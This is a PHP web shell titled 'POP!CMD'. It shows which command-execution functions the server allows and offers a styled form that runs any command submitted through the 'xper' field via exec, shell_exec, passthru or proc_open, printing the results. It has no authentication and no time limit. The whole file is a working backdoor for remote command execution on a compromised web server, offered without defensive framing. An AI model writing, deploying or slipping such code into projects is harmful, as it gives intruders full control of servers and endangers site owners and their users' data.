<?php
set_time_limit(0);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POP!CMD</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Odibee+Sans&display=swap');

        body {
            font-family: 'Odibee Sans', sans-serif;
            background-color: #020210;
            font-size: 22px;
        }
        select {
            font-family: 'Odibee Sans', sans-serif;
            font-size: 22px;
        }

        form {
            margin-top: 3%;
            text-align: center;
        }

        .cmd {
            width: 300px;
            height: 50px;
            border: 1px greenyellow solid;
            outline: none;
            border-radius: 10px;
            background-color: #020210;
            color: white;
        }

        .info {
            text-align: center;
        }

        b {
            color: white;
        }

        .centered-textarea {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 3%;
        }

        .centered-textarea textarea {
            width: 500px;
            height: 150px;
            background-color: white;
            outline: none;
            border: 0px;
            color: black;
            font-size: 15px;
        }

        a {
            text-decoration: none;
        }

        select {
            padding: 10px;
            width: 200px;
        }
    </style>
</head>

<body>
    <?php

    if (function_exists("system")) {
        $system = "<font style='color:yellow;'>enabled</font>";
    } else {
        $system = "<font style='color:red;'>disabled</font>";
    }
    if (function_exists("exec")) {
        $exec = "<font style='color:green;'>enabled</font>";
    } else {
        $exec = "<font style='color:red;'>disabled</font>";
    }
    if (function_exists("shell_exec")) {
        $shell_exec = "<font style='color:green;'>enabled</font>";
    } else {
        $shell_exec = "<font style='color:red;'>disabled</font>";
    }
    if (function_exists("passthru")) {
        $passthru = "<font style='color:green;'>enabled</font>";
    } else {
        $passthru = "<font style='color:red;'>disabled</font>";
    }
    if (function_exists("proc_open")) {
        $proc_open = "<font style='color:green;'>enabled</font>";
    } else {
        $proc_open = "<font style='color:red;'>disabled</font>";
    }
    function secho($a)
    {
        echo htmlspecialchars($a, ENT_QUOTES, 'UTF-8');
    }
    ?>
    <div class="info">
        <p>
            <a href="?">
                <b>HOME </b>
            </a>
        </p>
        <p><b>system: </b>
            <?php echo $system; ?>
        </p>
        <p><b>exec: </b>
            <?php echo $exec; ?>
        </p>
        <p><b>shell_exec: </b>
            <?php echo $shell_exec; ?>
        </p>
        <p><b>passthru: </b>
            <?php echo $passthru; ?>
        </p>
        <p><b>proc_open: </b>
            <?php echo $proc_open; ?>
        </p>
    </div>
    <form method="post">
        <select name="method">
            <option value="exec">exec</option>
            <option value="shell_exec">shell_exec</option>
            <option value="passthru">passthru</option>
            <option value="proc_open">proc_open</option>
        </select>
        <br>
        <br>
        <input type="text" name="xper" class="cmd" placeholder="whoami" autocomplete="off">
    </form>
    <div class="centered-textarea">
        <textarea spellcheck="false"><?php
        if (isset($_POST['method']) && isset($_POST['xper'])) {
            $method = $_POST['method'];
            $xper = $_POST['xper'];
            if ($method == "exec") {
                $output = array();
                exec($xper, $output);
                foreach ($output as $line) {
                    secho($line . "\n");
                }
            }
        }
        if ($method == "shell_exec") {
            $output = shell_exec($xper);
            secho($output);
        }
        if ($method == "passthru") {
            ob_start();
            passthru($xper);
            $output = ob_get_clean();
            secho($output);
        }
        if ($method == "proc_open") {
            $descriptors = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"],
            ];

            $process = proc_open($xper, $descriptors, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                while (!feof($pipes[1])) {
                    secho(fgets($pipes[1]));
                }
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }
        ?></textarea>
    </div>

</body>

</html>